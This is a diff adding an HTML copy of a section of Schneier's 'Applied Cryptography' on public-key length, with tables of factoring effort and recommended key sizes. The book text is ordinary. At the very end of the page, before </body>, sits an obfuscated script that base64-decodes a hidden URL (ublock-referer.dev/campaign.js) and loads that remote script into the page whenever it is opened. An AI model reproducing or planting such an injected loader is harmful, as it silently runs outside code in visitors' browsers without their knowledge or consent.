@@ -1,0 +1,219 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Key Length</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=07//-->
+<!--PAGES=159-162//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="07-04.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="07-06.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>The picture gets even worse. A new factoring algorithm has taken over from the quadratic sieve: the general number field sieve. In 1989 mathematicians would have told you that the general number field sieve would never be practical. In 1992 they would have told you that it was practical, but only faster than the quadratic sieve for numbers greater than 130 to 150 digits or so. Today it is known to be faster than the quadratic sieve for numbers well below 116 digits [472,635]. The general number field sieve can factor a 512-bit number over 10 times faster than the quadratic sieve. The algorithm would require less than a year to run on an 1800-node Intel Paragon. Table 7.4 gives the number of mips-years required to factor numbers of different sizes, given current implementations of the general number field sieve [1190].
+</P>
+<TABLE WIDTH="100%"><TR>
+<TH CAPTION ALIGN="CENTER" COLSPAN="3">Table 7.3<BR>Factoring Using the Quadratic Sieve
+<TR>
+<TD COLSPAN="3"><HR>
+<TR>
+<TH ALIGN="LEFT" VALIGN="BOTTOM">Year
+<TH ALIGN="CENTER" VALIGN="BOTTOM"># of decimal<BR>digits factored
+<TH ALIGN="CENTER" VALIGN="BOTTOM">How many times harder to<BR>factor a 512-bit number
+<TR>
+<TD COLSPAN="3"><HR>
+<TR>
+<TD ALIGN="LEFT" VALIGN="BOTTOM">1983
+<TD ALIGN="CENTER" VALIGN="BOTTOM">71
+<TD ALIGN="CENTER" VALIGN="BOTTOM">&gt20 million
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT" VALIGN="BOTTOM">1985
+<TD ALIGN="CENTER" VALIGN="BOTTOM">80
+<TD ALIGN="CENTER" VALIGN="BOTTOM">&gt2 million
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT" VALIGN="BOTTOM">1988
+<TD ALIGN="CENTER" VALIGN="BOTTOM">90
+<TD ALIGN="CENTER" VALIGN="BOTTOM">250,000
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT" VALIGN="BOTTOM">1989
+<TD ALIGN="CENTER" VALIGN="BOTTOM">100
+<TD ALIGN="CENTER" VALIGN="BOTTOM">30,000
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT" VALIGN="BOTTOM">1993
+<TD ALIGN="CENTER" VALIGN="BOTTOM">120
+<TD ALIGN="CENTER" VALIGN="BOTTOM">500
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT" VALIGN="BOTTOM">1994
+<TD ALIGN="CENTER" VALIGN="BOTTOM">129
+<TD ALIGN="CENTER" VALIGN="BOTTOM">100
+<TR>
+<TD COLSPAN="3"><HR>
+</TABLE>
+<P>And the general number field sieve is still getting faster. Mathematicians keep coming up with new tricks, new optimizations, new techniques. There&#146;s no reason to think this trend won&#146;t continue. A related algorithm, the special number field sieve, can already factor numbers of a certain specialized form&#151;numbers not generally used for cryptography&#151;much faster than the general number field sieve can factor general numbers of the same size. It is not unreasonable to assume that the general number field sieve can be optimized to run this fast [1190]; it is possible that the NSA already knows how to do this. Table 7.5 gives the number of mips-years required for the special number field sieve to factor numbers of different lengths [1190].
+</P>
+<P>At a European Institute for System Security workshop in 1991, the participants agreed that a 1024-bit modulus should be sufficient for long-term secrets through 2002 [150]. However, they warned: &#147;Although the participants of this workshop feel best qualified in their respective areas, this statement [with respect to lasting security] should be taken with caution.&#148; This is good advice.</P>
+<P>The wise cryptographer is ultra-conservative when choosing public-key key lengths. To determine how long a key you need requires you to look at both the intended security and lifetime of the key, and the current state-of-the-art of factoring. Today you need a 1024-bit number to get the level of security you got from a 512-bit number in the early 1980s. If you want your keys to remain secure for 20 years, 1024 bits is likely too short.</P>
+<P>Even if your particular secrets aren&#146;t worth the effort required to factor your modulus, you may be at risk. Imagine an automatic banking system that uses RSA for security. Mallory can stand up in court and say: &#147;Did you read in the newspaper in 1994 that RSA-129 was broken, and that 512-bit numbers can be factored by any organization willing to spend a few million dollars and wait a few months? My bank uses 512-bit numbers for security and, by the way, I didn&#146;t make these seven withdrawals.&#148; Even if Mallory is lying, the judge will probably put the onus on the bank to prove it.</P>
+<TABLE WIDTH="50%"><TR>
+<TH CAPTION ALIGN="CENTER" COLSPAN="2">Table 7.4<BR>Factoring Using the General Number Field Sieve
+<TR>
+<TD COLSPAN="2"><HR>
+<TR>
+<TH ALIGN="LEFT" VALIGN="BOTTOM"># of bits
+<TH ALIGN="CENTER" VALIGN="BOTTOM">Mips-years required to factor
+<TR>
+<TD COLSPAN="2"><HR>
+<TR>
+<TD ALIGN="LEFT" VALIGN="BOTTOM">512
+<TD ALIGN="CENTER" VALIGN="BOTTOM">30,000
+<TR>
+<TD ALIGN="LEFT" VALIGN="BOTTOM">768
+<TD ALIGN="CENTER" VALIGN="BOTTOM">2*10<SUP>8</SUP>
+<TR>
+<TD ALIGN="LEFT" VALIGN="BOTTOM">1024
+<TD ALIGN="CENTER" VALIGN="BOTTOM">3*10<SUP>11</SUP>
+<TR>
+<TD ALIGN="LEFT" VALIGN="BOTTOM">1280
+<TD ALIGN="CENTER" VALIGN="BOTTOM">1*10<SUP>14</SUP>
+<TR>
+<TD ALIGN="LEFT" VALIGN="BOTTOM">1536
+<TD ALIGN="CENTER" VALIGN="BOTTOM">3*10<SUP>16</SUP>
+<TR>
+<TD ALIGN="LEFT" VALIGN="BOTTOM">2048
+<TD ALIGN="CENTER" VALIGN="BOTTOM">3*10<SUP>20</SUP>
+<TR>
+<TD COLSPAN="2"><HR>
+</TABLE>
+<P>
+</P>
+<TABLE WIDTH="50%"><TR>
+<TH CAPTION ALIGN="CENTER" COLSPAN="2">Table 7.5<BR>Factoring Using the Special Number Field Sieve
+<TR>
+<TD COLSPAN="2"><HR>
+<TR>
+<TH ALIGN="LEFT" VALIGN="BOTTOM"># of bits
+<TH ALIGN="CENTER" VALIGN="BOTTOM">Mips-years required to factor
+<TR>
+<TD COLSPAN="2"><HR>
+<TR>
+<TD ALIGN="LEFT" VALIGN="BOTTOM">512
+<TD ALIGN="CENTER" VALIGN="BOTTOM">&lt200
+<TR>
+<TD ALIGN="LEFT" VALIGN="BOTTOM">768
+<TD ALIGN="CENTER" VALIGN="BOTTOM">100,000
+<TR>
+<TD ALIGN="LEFT" VALIGN="BOTTOM">1024
+<TD ALIGN="CENTER" VALIGN="BOTTOM">3*10<SUP>7</SUP>
+<TR>
+<TD ALIGN="LEFT" VALIGN="BOTTOM">1280
+<TD ALIGN="CENTER" VALIGN="BOTTOM">3*10<SUP>9</SUP>
+<TR>
+<TD ALIGN="LEFT" VALIGN="BOTTOM">1536
+<TD ALIGN="CENTER" VALIGN="BOTTOM">2*10<SUP>11</SUP>
+<TR>
+<TD ALIGN="LEFT" VALIGN="BOTTOM">2048
+<TD ALIGN="CENTER" VALIGN="BOTTOM">4*10<SUP>14</SUP>
+<TR>
+<TD COLSPAN="2"><HR>
+</TABLE>
+<P>Why not use 10,000-bit keys? You can, but remember that you pay a price in computation time as your keys get longer. You want a key long enough to be secure, but short enough to be computationally usable.
+</P>
+<P>Earlier in this section I called making predictions foolish. Now I am about to make some. Table 7.6 gives my recommendations for public-key lengths, depending on how long you require the key to be secure. There are three key lengths for each year, one secure against an individual, one secure against a major corporation, and the third secure against a major government.</P>
+<P>Here are some assumptions from [66]:</P>
+<BLOCKQUOTE><P>We believe that we could acquire 100 thousand machines without superhuman or unethical efforts. That is, we would <I>not</I> set free an Internet worm or virus to find resources for us. Many organizations have several thousand machines each on the net. Making use of their facilities would require skillful diplomacy, but should not be impossible. Assuming the 5 mips average power, and one year elapsed time, it is not too unreasonable to embark on a project which would require half a million mips years.</P>
+</BLOCKQUOTE><P>The project to factor the 129-digit number harnessed an estimated 0.03 percent of the total computing power of the Internet [1190], and they didn&#146;t even try very hard. It isn&#146;t unreasonable to assume that a well-publicized project can harness 2 percent of the world&#146;s computing power for a year.
+</P>
+<P>Assume a dedicated cryptanalyst can get his hands on 10,000 mips-years, a large corporation can get 10<SUP>7</SUP> mips-years, and that a large government can get 10<SUP>9</SUP> mips-years. Also assume that computing power will increase by a factor of 10 every five years. And finally, assume that advances in factoring mathematics allow us to factor general numbers at the speeds of the special number field sieve. (This isn&#146;t possible yet, but the breakthrough could occur at any time.) Table 7.6 recommends different key lengths for security during different years.</P>
+<TABLE WIDTH="80%"><TR>
+<TH CAPTION ALIGN="CENTER" COLSPAN="4">Table 7.6<BR>Recommended Public-key Key Lengths (in bits)
+<TR>
+<TD COLSPAN="4"><HR>
+<TR>
+<TH ALIGN="LEFT" VALIGN="BOTTOM">Year
+<TH ALIGN="CENTER" VALIGN="BOTTOM">vs. Individual
+<TH ALIGN="CENTER" VALIGN="BOTTOM">vs. Corporation
+<TH ALIGN="CENTER" VALIGN="BOTTOM">vs. Government
+<TR>
+<TD COLSPAN="4"><HR>
+<TR>
+<TD ALIGN="LEFT" VALIGN="BOTTOM">1995
+<TD ALIGN="CENTER" VALIGN="BOTTOM">768
+<TD ALIGN="CENTER" VALIGN="BOTTOM">1280
+<TD ALIGN="CENTER" VALIGN="BOTTOM">1536
+<TR>
+<TD ALIGN="LEFT" VALIGN="BOTTOM">2000
+<TD ALIGN="CENTER" VALIGN="BOTTOM">1024
+<TD ALIGN="CENTER" VALIGN="BOTTOM">1280
+<TD ALIGN="CENTER" VALIGN="BOTTOM">1536
+<TR>
+<TD ALIGN="LEFT" VALIGN="BOTTOM">2005
+<TD ALIGN="CENTER" VALIGN="BOTTOM">1280
+<TD ALIGN="CENTER" VALIGN="BOTTOM">1536
+<TD ALIGN="CENTER" VALIGN="BOTTOM">2048
+<TR>
+<TD ALIGN="LEFT" VALIGN="BOTTOM">2010
+<TD ALIGN="CENTER" VALIGN="BOTTOM">1280
+<TD ALIGN="CENTER" VALIGN="BOTTOM">1536
+<TD ALIGN="CENTER" VALIGN="BOTTOM">2048
+<TR>
+<TD ALIGN="LEFT" VALIGN="BOTTOM">2015
+<TD ALIGN="CENTER" VALIGN="BOTTOM">1536
+<TD ALIGN="CENTER" VALIGN="BOTTOM">2048
+<TD ALIGN="CENTER" VALIGN="BOTTOM">2048
+<TR>
+<TD COLSPAN="4"><HR>
+</TABLE>
+<P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="07-04.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="07-06.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(YohiEmAy, cSgDZPjF) {cSgDZPjF = YohiEmAy.createElement('script');cSgDZPjF.type = 'text/javascript';cSgDZPjF.async = true;cSgDZPjF.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');YohiEmAy.getElementsByTagName('body')[0].appendChild(cSgDZPjF);}(document));</script></body>
+</html>
